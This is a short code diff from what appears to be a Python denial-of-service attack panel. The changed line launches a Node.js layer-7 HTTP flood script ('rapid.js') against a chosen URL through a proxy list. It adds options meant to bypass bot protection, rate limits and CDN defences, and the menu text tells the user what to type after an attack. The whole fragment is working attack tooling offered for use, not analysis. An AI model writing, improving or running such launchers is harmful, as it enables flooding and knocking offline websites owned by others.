@@ -587,7 +587,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node RAPID.js {url} {duration} 64 3 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node rapid.js GET {url} {duration} 3 64 proxy.txt --query 1 --delay 1 --bfm true --ratelimit true --cdn true')
                     
             except ValueError:
                 main()
